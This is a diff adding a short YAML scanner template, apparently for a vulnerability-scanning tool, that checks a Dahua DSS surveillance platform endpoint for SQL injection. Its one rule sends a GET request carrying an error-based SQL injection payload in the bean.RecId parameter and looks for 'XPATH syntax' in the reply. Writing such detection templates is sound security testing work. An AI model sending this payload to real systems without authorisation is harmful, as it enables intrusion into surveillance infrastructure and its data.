@@ -1,0 +1,11 @@
+name: 大华DSS综合监控管理平台-getAttList-SQL
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /portal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1
+    expression:
+      body_all:
+        - "XPATH syntax"
